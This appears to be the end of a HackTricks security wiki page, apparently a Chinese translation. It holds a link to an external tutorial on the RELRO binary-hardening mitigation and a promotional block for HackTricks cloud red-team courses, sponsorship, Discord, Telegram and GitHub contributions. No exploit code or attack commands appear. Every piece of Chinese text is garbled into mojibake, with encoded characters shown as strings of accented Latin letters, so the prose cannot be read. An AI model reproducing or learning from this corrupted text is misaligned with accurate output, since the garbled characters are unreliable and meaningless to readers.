* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µAWSé»‘å®¢æ”»å‡»ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µGCPé»‘å®¢æ”»å‡»ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordå°ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥å°ç»„**](https://t.me/peass)æˆ–**åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHubåº“æäº¤PRæ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
